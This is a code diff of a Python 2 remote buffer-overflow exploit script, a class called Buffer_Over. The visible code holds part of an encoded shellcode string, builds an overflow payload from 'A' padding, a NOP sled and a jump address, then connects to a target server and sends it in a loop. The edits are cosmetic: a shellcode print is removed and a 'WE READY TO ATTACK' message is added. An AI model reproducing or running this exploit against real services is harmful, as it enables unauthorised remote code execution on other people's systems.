@@ -106,7 +106,7 @@ class Buffer_Over:
 "\x88\xdf\xcc\x4b\x88\xdf\xf2\x70\x5e\xe6\x80\xb7\x62\x5d\x9a"
 "\x82\xc7\xf4\x31\xec\x54\x06\x10"
                           )
-          print self.shellcode
+         
          
      def little_endian(self):
              try:
@@ -121,10 +121,11 @@ class Buffer_Over:
              except KeyboardInterrupt:
                 print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
                 exit()
-
+             
      def attack_all(self):
           while True:
-	       try:                  
+	       try: 
+                                  
                    socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    Start_string = self.location*"A"        
                    NO_Operation = len(self.Requst_String) - self.location  - len( self.jump_address) 
@@ -136,6 +137,7 @@ class Buffer_Over:
                    time.sleep(2)
                    print "\n[+]conncet server port is  : ", self.server_port         
                    socket_2.connect((self.server_ip,self.server_port))
+                   print "\n[+]WE READY TO ATTACK !![+]"  
                    data_recv  = socket_2.recv(1024)
                    socket_2.send( attack + '\r\n')
                    time.sleep(2)
@@ -164,10 +166,6 @@ class Buffer_Over:
                   
 if __name__ == '__main__':
    Buffer_Over()
-
-
-
-
 
 
 
